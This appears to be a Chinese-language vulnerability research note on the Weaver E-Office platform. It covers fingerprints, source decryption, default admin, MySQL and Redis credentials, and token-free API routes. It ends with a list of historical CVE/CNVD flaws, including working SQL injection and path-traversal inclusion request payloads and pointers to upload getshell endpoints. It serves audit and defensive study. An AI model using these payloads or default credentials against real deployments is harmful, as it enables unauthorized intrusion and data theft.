# SecurityList

## 泛微E-Office ##

### (1) 漏洞指纹 ###

-  fofa
  app="泛微-EOffice"
- v10系列

`<title>泛微协同办公e-office标准产品</title>`

- v9系列
  /webservice-xml/login/login.wsdl.php
  hash：e321f05b151d832859378c0b7eba081a
  /favicon.ico
  hash：9b1d3f08ede38dbe699d6b2e72a8febb
  /Admin_Management/upload/desk.gif
  hash：5bbe8944d28ae0eb359f4d784a4c73cc
  /images/login/login_text%20.png
  hash：76aa04a85b1f3dea6d3215b27153e437
  /images/login/login_logo.png|
  hash：dd482b50d4597025c8444a3f9c3de74d
  /images/login/choose_lang_bg.png
  hash：86483c8191dcbc6c8e3394db84ae2bdc
  
  > ref：[雨苁-CMS指纹识别(2) 解密与调试](https://www.ddosi.org/b244/)

### (2) 解密与调试

环境是一体安装包exe文件，按照提示正常安装完毕后，web根目录在v9系列是webroot，v10系列是www。

- v9系列

v9.5版使用php Zend 5.x进行加密该目录的文件，使用SeayDzend工具或者百度php zend解密在线网站进行解密即可。

由于zend解密不完全，不能直接用解密的webroot目录替换原来的webroot目录。只能通过替换单个页面，自行设定断点，dump出来变量的内容。

v9系列使用的php Zend加密版本比较低，使用在线解密。

- v10系列

使用ioncube 10加密，使用[easytoyou.com](https://easytoyou.eu/)（月付费80+RMB）解密。p牛在`https://govuln.com/tool/phpdec/`提供了对该网站的免费批量解密通道，搭建了一个sase（仅限代码审计星球的小伙伴使用）。

easytoyou需要挂代理可能才能打开（英国网站，不挂代理访问很慢），批量解密发送给官方邮箱解密的（存在解密不完全情况）。如果自己写脚本批量解密，由于网站自己设置了反爬机制+网速断续导致解密不完全或者出现解密到一半无法再继续进行。官方发回来解密文件没有p牛批量解密的通道完整性高。

### (3) 关键数据 ###

- 后台账户：v10系列admin用户默认密码为123456，v9系列admin密码默认为空，首次登陆后不会强制修改用户密码。

* 架构和服务：php7.4.30+apache2.4.41+mysql5.5.53+redis3.0.504+node.js13.14.0

  php：C:\eoffice\php\php.ini

  mysql：C:\eoffice\mysql\my.ini，端口3310，默认账户root/weoffice10

  redis：C:\eoffice\redis\redis.windows.conf，redis端口6379，默认只能本地访问`bind 127.0.0.1`，默认密码：eoffice10redis

  网站系统http访问，端口默认为8010（`apache/conf/httpd.conf`修改），默认上传附件地址`C:/eoffice/attachment`（泛微服务管理平台（E-Office Server）可以修改）。

* 环境信息查看: 

  【v10】`http://ip:8010/eoffice10/server/public/api/empower/{pc|mobile}-empower`（pc｜mobile的版本和授权信息）

  【v10】`/eoffice10/server/public/api/empower/get-system-version`（只能查看版本）

  【v10】`C:\eoffice\www\eoffice10\version.json`

  【v9】`/inc/reg.php`能在系统版本对话框中查看到版本信息，该页面是注册授权页面

  相关其他页面：`inc/reg_check.php`、`inc/reg_look.php` 

  【v9】`inc/oa_type.php`查看安装的是v9系列哪个类别的版本

* 环境下载和相关文档：

【v10】官网下载（最新更新为10_20221012）：https://service.e-office.cn/download

【v9】百度网盘（含9.5系列补丁包）：https://pan.baidu.com/s/1mi6OFUS#list/path=%2F&parentPath=%2FEo-9.0pc%E7%AB%

【v10】[e-office 服务端接口API文档](https://service.e-office.cn/access/api_doc/v11.0/api_doc_file/index.html#api-概述-tokenValidation)

[【泛微E-Office-v10】知识库-开发者指南-api接口说明](https://service.e-office.cn/knowledge/detail/43/ke7d0a3)

- 补丁更新方式：

v10可以通过服务管理平台直接在线更新；手动更新直接把补丁包内的所有内容替换原安装目录和web目录即可。

v9更新需要手动将补丁包的webroot目录覆盖原webroot目录，然后登录系统，系统会自动进行检测，切记不能关闭登录窗口，检测完毕后会提示申请更新的对话框，点击更新即可。

如果更新失败，可直接重复上述操作再次更新。更新完毕后系统会继续检测是否还有更新的补丁包，请求是否继续更新。

### (4) 路由特点 ###

整体架构既使用了laravel框架，路由情况也是参照于此。`routes/web.php`是配置路由的文件，从中了解到固定路由前缀`/eoffice10/server/public/api/根据模块查询模块映射的路由`。其中有2个路由组不用通过权限和api_token校验,

1. $noTokenApi

   属于第二个路由组，访问的时候不会校验api_token
   
   ```php
   $noTokenApi = ["Auth"       => [["auth/login", "login", "post"], ["auth/refresh", "refresh", "get"],
                                   ["auth/login/quick", "quickLogin", "post"],
                                   ["auth/login/theme", "getLoginThemeAttribute"],
                                   ["auth/sms/verifycode/{phoneNumber}", "getSmsVerifyCode"],
                                   ["auth/sso", "singleSignOn", "post"], ["auth/sso", "singleSignOn"],
                                   ["auth/sso/registerinfo", "ssoRegisterInfo"],
                                   ["auth/dynamic-code/sync", "dynamicCodeSync", "POST"],
                                   ["auth/get-login-auth-type", "getLoginAuthType"], ["auth/check", "check"],
                                   ["auth/logout", "logout"], ["auth/qrcode/general", "generalLoginQRCode"],
                                   ["auth/qrcode/sign-on", "qrcodeSignOn", "post"], ["auth/initinfo", "getLoginInitInfo"],
                                   ["auth/password/modify", "modifyPassword", "post"],
                                   ["auth/check-dynamic-code-status", "getDynamicCodeSystemParamStatus"],
                                   ["auth/captcha/{temp}", "getCaptcha"],
                                   ["auth/dynamic-auth-open", "getUserDynamicCodeAuthStatus"],
                                   ["auth/cas-login-out/{loginUserId}", "casLoginOut"],
                                   ["auth/socket/check", "checkToken"], ["auth/token", "deleteToken", "delete"],
                                   ["auth/check-token", "checkTokenExist", "post"]],
                  "Attendance" => [["attendance/validate/{type}", "outSendValidate", "post"]],
                  "User" => [["user/register/qrcode/{sign}", "checkRegisterQrcode"],
                             ["user/share/register", "userShareRegister", "post"],
                             ["user/socket/get-socket", "getUserSocket"]],
                  "System" => ["Security" => [["security/upload/{module}", "getModuleUpload"],
                                              ["security/system-title", "getSystemTitleSetting"]],
                               "Address" => [["address/out/province", "getIndexProvince"],
                                             ["address/out/city", "getIndexCity"],
                                             ["address/out/city-district/{cityId}", "getCityDistrict"],
                                             ["address/out/province/{provinceId}/city", "getIndexProvinceCity"],
                                             ["address/out/province/{provinceId}/city/{cityId}", "getProvinceCity"]],
                               "Prompt" => [["prompt/get-new-user-guide-flag/{route}", "getNewUserGuideFlag"],
                                            ["prompt/set-new-user-guide-flag", "setNewUserGuideFlag", "post"]]],
                  "Empower" => [["empower/pc-empower", "getPcEmpower"], ["empower/mobile-empower", "getMobileEmpower"],
                                ["empower/get-system-version", "getSystemVersion"],
                                ["empower/get-machine-code", "getMachineCode"], ["empower/export", "exportEmpower"],
                                ["empower/import", "importEmpower", "post"],
                                ["empower/case-platform", "getEmpowerPlatform"]],//授权
                  "Weixin" => [["weixin/check", "weixinCheck"],
                               ["weixin/weixin-token", "getWeixinToken"],
                               ["weixin/wxsignpackage", "weixinSignPackage"], ["weixin/weixin-move", "weixinMove", "post"],
                               ["weixin/weixin-qrcode", "getBindingQRcode"], ["weixin/invoice/param", "getInvoiceParam"]],
                  "WorkWechat" => [["work-wechat/workwechat-get", "getWorkWechat"],
                                   ["work-wechat/workwechat-flag", "workwechatCheck"],
                                   ["work-wechat/workWechatsignpackage", "workwechatSignPackage"],
                                   ["work-wechat/getSignatureAndConfig", "getSignatureAndConfig", "post"],
                                   ["work-wechat/workwechat-move", "workwechatMove", "post"],
                                   ["work-wechat/workwechat-userTransfer", "tranferUser"],
                                   ["work-wechat/workwechat-syncCallback", "syncCallback", "get"],
                                   ["work-wechat/workwechat-syncCallback", "syncCallback", "post"],
                                   ["work-wechat/invoice/param", "getInvoiceParam"]],
                  "Dgwork" => [["dgwork/dgwork-signPackage", "dgworkSignPackage", "get"],
                               ["dgwork/dgwork-move", "dgworkMove", "post"]],
                  "Dingtalk" => [["dingtalk/get-dingtalk", "getDingtalk"],
                                 ["dingtalk/dingtalk-clientPackage", "dingtalkClientpackage"],
                                 ["dingtalk/dingtalk-attendance", "dingtalkAttendance"],
                                 ["dingtalk/dingtalk-move", "dingtalkMove", "post"],
                                 ["dingtalk/dingtalkReceive", "dingtalkCallbackReceive", "post"]],
                  "Welink" => [["welink/welink-move", "welinkMove", "post"]],
                  "Lanxin" => [["lanxin/lanxin-move", "lanxinMove", "post"]],
                  "Mobile" => [["mobile/initinfo", "initInfo"], ["mobile/oa/unbind", "unbindMobile", "post"]],
                  "Lang" => [["lang/effect-packages", "getEffectLangPackages"],
                             ["lang/package/default/locale", "getDefaultLocale", "get"],
                             ["lang/file/{module}/{locale}", "getLangFile"], ["lang/version", "getLangVersion"]],
                  "Attachment" => [["attachment/auth-file", "attachmentAuthFile", "post"],
                                   ["attachment/share/{shareToken}", "loadShareAttachment"],
                                   ["attachment/path/migrate", "migrateAttachmentPath", "post"]],
                  "Menu" => [["menu/user-menu-list/{user_id}", "getUseMenuList"]],
                  "XiaoE" => [["xiao-e/{module}/dict/{method}", "extendGetDictSource"],
                              ["xiao-e/{module}/check/{method}", "extendCheck"],
                              ["xiao-e/{module}/init/{method}", "extendInitData"],
                              ["xiao-e/dict/{method}", "getDictSource"], ["xiao-e/check/{method}", "check"],
                              ["xiao-e/init/{method}", "initData"], ["xiao-e/system/test", "testApi"]],
                  "Elastic" => [["elastic/menu/register", "registerElasticMenu", "post"],
                                ["elastic/menu/register/info", "getElasticMenuUpdateInfo"],
                                ["elastic/menu/remove", "removeElasticMenu", "delete"],
                                ["elastic/run/status", "isElasticRunning"],
                                ["elastic/data/migration", "migrationData", "post"],
                                ["elastic/data/migration", "getMigrationDetail"],
                                ["elastic/data/test", "dealTestData", "post"]],
                  "ElectronicSign" => [["electronic-sign/contract/status", "changeContractStatus", "post"],
                                       ["electronic-sign/seal-apply/status", "changeSealApplyStatus", "post"]],
                  "OpenApi" => [["open-api/get-token", "openApiToken", "post"],
                                ["open-api/refresh-token", "openApiRefreshToken", "post"]],
                  "UnifiedMessage" => [["unified-message/register-token", "registerToken", "post"]],
                  "Portal" => [["portal/eo/avatar/{userId}", "getEofficeAvatar"]],
                  "IntegrationCenter" => [["integration-center/todo-push/test", "todoPushTest", "post"]],
                  "PersonnelFiles" => [["personnel-files/get-personnel-files-tree/{deptId}",
                                        "getOrganizationPersonnelMembers", "post"]],
                  "Home" => [["home/boot-page-status", "getBootPageStatus"],
                             ["home/boot-page-status", "setBootPageStatus", "post"],
                             ["home/scene/seeder", "sceneSeeder", "post"],
                             ["home/scene/seeder/progress", "sceneSeederProgress", "get"], ["home/url/data", "getUrlData"],
                             ["home/version/check", "checkSystemVersion"], ["home/system/update", "updateSystem"],
                             ["home/empty-scene/seeder", "emptySceneSeeder", "get"]]];
   
   if (is_array($modules)) {
       $currentRoutes = isset($noTokenApi[$modules[0]]) ? isset($noTokenApi[$modules[0]][$modules[1]]) ? $noTokenApi[$modules[0]][$modules[1]] : [] : [];
   } else {
       $currentRoutes = isset($noTokenApi[$modules]) ? $noTokenApi[$modules] : [];
   }
   if (!empty($currentRoutes)) {
       $router->group(["namespace" => "App\\EofficeApp",
                       "middleware" => "decodeParams|ModuleEmpowerCheckNoToken",
                       "prefix"    => "/api"], function ($router) {
           register_routes($router, $moduleDir, $modules, $currentRoutes);
       });
   }
   ```

2. 其他路由组和模块文件夹内的routes.php

每个模块文件夹内部还允许设置`routes.php`文件配置路由，该部分的路由属于路由组1，这部分的路由组基本会校验权限和api token：

```php
$router->group(["namespace"  => "App\\EofficeApp",
                "middleware" => "decodeParams|
                ModuleEmpowerCheckNoToken|
                authCheck|
                ModulePermissionsCheck|
                menuPower|
                openApiMiddleware|
                syncWorkWeChat|
                verifyCsrfReferer",
                "prefix"     => "/api"], function ($router) {
    register_routes($router, $moduleDir, $modules);
});
```

 Web/routes.php的其他路由组访问模式直接查看代码中的设置就可以了。

3. api token（令牌）获取

需要api token验证的路由，在请求内附上token才能正常请求。传递方式有两种：api_token参数和header头Authorization字段

e.g. header头传输的固定格式`Authorization:Bearer 令牌`

令牌需要用户登录后进行生成，可以通过chrome浏览器f12-应用-本地存储空间搜索`loggedUsersIMToken`密钥字段获取。令牌传输的相关错误和异常码，可以在api文档中查看（第三节倒数第二个链接）。	

### (5) 历史漏洞 ###

这里放的都是2022年目前还能找到详情公开的漏洞。

- SQL注入

```
（1）【<=9.0_141103】【CNVD-2022-43246】未授权SQL注入
POST /general/crm/linkman/query/detail.php HTTP/1.1
linkman_id=-1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28%7B0%7D%2C%7B1%7D%2C%7B0%7D%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-

（2）【<=9.5_20220113】/E-mobile/App/System/UserSelect/index.php 后台登录布尔逻辑SQL注入
POST /E-mobile/App/System/UserSelect/index.php?m=getUserLists HTTP/1.1
privId=0&deptId=1+or+1=1#&sessionkey=99lk5c0ln03vm4kbd1ofet3u41
```

- 文件操作

```
(1)【<=9.5】/webroot/general/index/UploadFile.php 文件上传
CNVD-2021-49104
https://blog.csdn.net/qq_38850916/article/details/121696515

（2）【8-10】iWebOffice控件上传getshell
【<=8】【未授权】/iWebOffice/OfficeServer.php和/iWebOffice/OfficeServer2.php
REF：http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
【<10】【未授权】eoffice10/server/app/EofficeApp/IWebOffice/Services/IWebOfficeService.php中$m0ption=SAVEFILE和SAVEPDF分支
Patch：http://v10.e-office.cn/10safepack/%E6%B3%9B%E5%BE%AEe-officev10.0_20210909%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81.zip

（3）【<=v9.5_20220113】【CNVD-2022-43247】未授权包含
补丁对比，点绕过：
Patch：http://v10.e-office.cn/eoffice9update/20220525/webroot.zip
POC：
POST /gotoeoffice.php HTTP/1.1
USER_LANG=../test.php.....................................................................................................................................................................................................................................................

（4）【<9.5_20220113】【CNVD-2021-103144】登录绕过+文件上传getshell
http://www.dcrblog.cn/archives/e-office9getshell
```

- 信息泄漏

```
（1）【<=9.5】/UserSelect/main.php 信息泄漏
直接访问/UserSelect/，成功会显示系统用户有哪些
v8版的编号：wooyun-2015-0128007，和poc：/UserSelect/main.php
```
